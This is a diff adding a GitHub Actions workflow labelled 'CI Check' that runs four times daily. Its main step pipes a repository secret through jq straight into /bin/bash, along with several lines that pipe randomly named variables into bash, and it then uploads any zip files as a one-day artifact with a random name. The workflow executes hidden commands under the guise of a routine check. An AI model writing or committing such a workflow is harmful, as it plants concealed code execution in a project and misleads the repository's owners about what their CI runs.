@@ -1,0 +1,30 @@
+name: CI Check
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '7 0,6,12,18 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  action:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Begin
+        env:
+          ae2: ${{ secrets.ae2 }}
+        run: |
+          printf '%s' "$ae2" | jq -r .c251 | /bin/bash
+          printf '%s' "$udxqa50602" | jq -r .n24840 | /bin/bash
+          echo $w0 | jq -r .jb10186 | /bin/bash
+          printf '%s' "$dph10" | jq -r .rnzyn414 | /bin/bash
+          echo $dkk67673 | jq -r .v628 | /bin/bash
+
+      - name: Save results
+        uses: actions/upload-artifact@v4
+        with:
+          name: ZfhXNj4k
+          path: "*.zip"
+          retention-days: 1
